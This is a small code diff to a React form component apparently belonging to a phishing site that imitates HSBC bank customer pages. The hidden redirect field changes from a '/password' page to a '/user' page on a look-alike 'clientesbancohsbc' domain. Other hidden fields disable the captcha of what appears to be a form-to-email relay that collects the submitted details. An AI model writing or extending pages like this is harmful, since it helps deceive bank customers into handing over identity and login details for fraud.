@@ -14,7 +14,7 @@ const Numerocelular = () => {
                 <div className="input-cont">
                     <input className='inputname' name='name' type="text"/>
                     <input type="hidden" name="email" value="" />
-                    <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/password" />
+                    <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
                     <input type="hidden" name="_captcha" value="false" />
                 </div>
                 <div className="olvidouser">
